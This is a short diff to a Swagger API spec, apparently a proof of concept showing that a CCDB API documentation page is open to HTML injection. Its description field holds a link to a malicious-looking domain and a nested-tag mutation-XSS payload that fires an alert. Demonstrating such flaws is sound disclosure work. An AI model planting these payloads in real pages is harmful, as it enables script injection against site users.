@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: Validation of HTML INJECTION
+  title: Swagger Version of CCDB API Documention is prone to HTML Injection 
   description: |
     <h1>Be Careful <h1><a href="https://malicious.com">Click Here</a></h1></h1>
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1></form>
